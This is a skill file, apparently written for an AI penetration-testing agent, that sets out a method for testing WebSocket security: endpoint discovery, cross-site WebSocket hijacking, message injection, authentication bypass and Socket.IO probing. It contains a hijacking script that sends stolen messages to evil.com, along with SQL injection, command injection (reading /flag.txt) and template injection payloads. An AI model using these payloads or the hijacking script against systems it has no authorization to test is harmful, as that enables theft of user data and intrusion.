---
name: websocket-attack
description: "WebSocket security testing. Use when the target uses the ws:// or wss:// protocol, when page JavaScript contains new WebSocket() calls, or when a 101 Switching Protocols response is observed. Covers WS hijacking (CSWSH), message injection, authentication bypass, and information disclosure"
zh-signals: "测试 WebSocket 端点的跨站劫持、消息注入、认证绕过与信息泄露风险。信号:WebSocket,CSWSH,消息注入,认证绕过,ws协议"
when-to-use: >-
  Use when a target uses ws:// or wss://, page JavaScript calls new WebSocket(), or a
  101 Switching Protocols response is observed.
metadata:
  tags: "websocket,ws,wss,cswsh,hijack,real-time,socket,upgrade"
  category: "exploit"
---

# WebSocket Security Testing Methodology


WebSocket provides full-duplex communication, but its security mechanisms are often overlooked — there is no automatic same-origin policy protection, and no standard practice for CSRF tokens.

## Phase 1: Discover WebSocket Endpoints

### 1.1 Page Analysis
Search the JavaScript source code for:
- `new WebSocket(`
- `ws://` or `wss://`
- `socket.io` (the Socket.IO library)
- `.onmessage`, `.send(`

### 1.2 Network Layer Identification
- HTTP 101 response + `Upgrade: websocket` header
- Common paths: `/ws`, `/websocket`, `/socket.io/`, `/cable` (ActionCable)

## Phase 2: Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake is an HTTP Upgrade request, and the browser automatically carries the Cookie. If the server does not check the Origin header → cross-site hijacking is possible.

### 2.1 Detection
```
http_request url="http://target/ws" method="GET" headers={"Upgrade":"websocket","Connection":"Upgrade","Sec-WebSocket-Version":"13","Sec-WebSocket-Key":"dGhlIHNhbXBsZSBub25jZQ==","Origin":"https://evil.com"}
```
If it returns 101 → Origin is not validated → hijacking is possible.

### 2.2 Exploitation
```html
<script>
var ws = new WebSocket("wss://target.com/ws");
ws.onopen = function() {
    ws.send('{"action":"getProfile"}');
};
ws.onmessage = function(e) {
    // steal data
    fetch("http://evil.com/log?d=" + encodeURIComponent(e.data));
};
</script>
```

## Phase 3: Message Injection

### 3.1 Common Injection Points
WebSocket messages are usually JSON, so test injection with:

**SQL injection**:
```json
{"action":"search","query":"' OR 1=1--"}
```

**Command injection**:
```json
{"action":"ping","host":"127.0.0.1; cat /flag.txt"}
```

**SSTI**:
```json
{"action":"render","template":"{{7*7}}"}
```

### 3.2 Authentication Bypass
Some WS implementations authenticate during the handshake but do not check permissions at the message level:
- Send an administrative action message after connecting
- Modify the user_id/role fields in the message
- Send undocumented action types (discovered in the JavaScript source)

## Phase 4: Information Disclosure

WebSocket is often used for real-time features and may leak:
- Other users' chat messages
- System notifications (including internal information)
- Real-time logs/debug information
- Broadcasts of administrative operations

Listen to all messages without rushing to send — sometimes passive listening is enough to obtain sensitive data.

## Phase 5: Socket.IO Special Handling

Socket.IO uses its own protocol format:
- Message format: `42["event_name",{data}]` (4=message, 2=event)
- Poll over HTTP first, then upgrade to WS: `/socket.io/?EIO=4&transport=polling`
- Namespaces: try connecting to the `/admin` namespace to attempt access to administrative features

### 5.1 Socket.IO Enumeration
- Event name enumeration: search the JavaScript source code for hidden event names

### 5.2 Authentication Gaps
- Authentication exists at handshake time but permissions are not checked at the message level (authentication inconsistency / privilege gap)

## Further Reading

- Advanced WebSocket exploitation techniques (in-depth CSWSH / SockJS / smuggling / credential extraction) → [references/websocket-exploitation.md](references/websocket-exploitation.md)

## Phase 6: Notes

- WebSocket is not protected by the browser same-origin policy (it relies solely on server-side Origin checks)
- Message content usually has no automatic encoding/escaping, so the injection risk is high
- Long-lived connections mean you can keep listening and injecting
